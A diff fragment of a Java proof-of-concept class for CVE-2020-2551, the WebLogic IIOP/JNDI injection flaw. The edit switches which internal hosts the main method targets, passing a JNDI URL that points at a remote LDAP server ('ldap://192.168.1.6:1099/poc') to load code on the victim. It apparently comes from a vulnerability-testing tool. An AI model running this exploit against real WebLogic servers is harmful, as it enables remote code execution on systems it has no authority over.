@@ -159,13 +159,13 @@ public class CVE_2020_2551 implements VulTest {
     public static void main(String[] args) throws Exception {
         CVE_2020_2551 vul = new CVE_2020_2551();
         String jdnUrl = "ldap://192.168.1.6:1099/poc";
-        jdnUrl = "ldap://10.10.10.172:1099/poc";
+//        jdnUrl = "ldap://10.10.10.172:1099/poc";
 //        System.out.println(vul.vulnerable("10.10.10.172", 7001,jdnUrl));
 //        System.out.println(vul.vulnerable("10.10.10.168", 7001,jdnUrl));
-        System.out.println(vul.vulnerable("10.10.10.173", 7001,jdnUrl));
-        System.out.println(vul.vulnerable("10.10.10.162", 7001,jdnUrl));
-        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));
+//        System.out.println(vul.vulnerable("10.10.10.173", 7001,jdnUrl));
+//        System.out.println(vul.vulnerable("10.10.10.162", 7001,jdnUrl));
+//        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));
 
-//        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
+        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
     }
 }
